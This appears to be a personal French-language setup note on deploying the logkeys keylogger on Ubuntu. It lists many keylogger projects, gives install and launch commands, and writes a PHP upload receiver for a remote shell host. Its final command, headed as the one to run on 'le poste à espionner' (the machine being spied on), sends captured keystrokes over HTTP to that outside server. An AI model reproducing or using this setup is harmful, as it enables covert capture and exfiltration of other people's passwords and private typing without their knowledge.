# Mise en place d'un key loggers sur linux

## Les différents keylogger (finalement, on choisit logkeys)

https://blog.rom1v.com/2011/11/keylogger-sous-gnulinux-enregistrer-les-touches-tapees-au-clavier/

http://www.tux-planet.fr/logkeys-un-keylogger-sous-linux/

https://artduweb.com/tutoriels/keylogger

https://askubuntu.com/questions/169887/how-can-i-detect-a-keylogger-on-my-system
https://linux.die.net/man/8/uberkey
lkl.sourceforge.net
https://sourceforge.net/projects/lkl/

https://sourceforge.net/p/pykeylogger/wiki/Installation_Instructions/

https://gist.github.com/brentvollebregt/a6f28546744a34368dca8030413ee093

https://github.com/WilsonKoder/PieLogger

https://www.geeksforgeeks.org/design-a-keylogger-in-python/

https://github.com/toxic-ig/PythonKeylogger

https://github.com/nanotube/pykeylogger

https://github.com/amoffat/pykeylogger

https://askubuntu.com/questions/169887/how-can-i-detect-a-keylogger-on-my-system

https://github.com/kernc/logkeys
https://github.com/kernc/logkeys/blob/master/docs/PostHTTP.md

https://github.com/nathanlopez/Stitch

https://nathanlopez.github.io/Stitch/

https://github.com/GiacomoLaw/Keylogger

https://simple-keylogger.github.io/

https://simple-keylogger.github.io/linux.html

https://github.com/mehulj94/Radium-Keylogger

https://github.com/hiamandeep/py-keylogger

https://www.techinfected.net/2015/10/how-to-make-simple-basic-keylogger-in-python-for-linux.html

https://github.com/kernc/logkeys
https://github.com/kernc/logkeys/blob/master/docs/PostHTTP.md


## Installation de logkeys sous ubuntu

### installation par paquet binaire ou avec les sources
paquet :
```
sudo apt-get install logkeys

```
sources :
```
./installLogkeys.sh
```

### Premiers tests
lancement :
 - pas avec llk, mais avec : sudo logkeys -s
 - avec le bon device : -d event4
 - avec le bon mappage clavier : --keymap logkeys/keymaps/fr.map
sudo logkeys -s --keymap logkeys/keymaps/fr.map -d event4

affichage :
sudo tail -f /var/log/logkeys.logs

### Amelioration : envoi des logs sur un site distant
#### Creation d'un fichier upload.php
```
vi upload.php
```

```
<?php

if ($_SERVER['REQUEST_METHOD'] == 'POST') {
  
  $file = $_FILES['file'];
  
  if ($file['error'] === UPLOAD_ERR_OK) 
    move_uploaded_file($file['tmp_name'], 'new.log');
}

?>

```

#### Transfert de ce fichier php vers nic-nac.project
```
ssh fgarel@nic-nac-project.org

```
Le log pourra donc se faire a cette adresse

https://www.freeshell.de/~fgarel/

https://www.freeshell.de/~fgarel/upload.php

#### La commande a executer sur le poste à espionner
```
sudo logkeys -s --keymap logkeys/keymaps/fr.map -d event4 --post-http=https://www.freeshell.de/~fgarel/upload.php
```
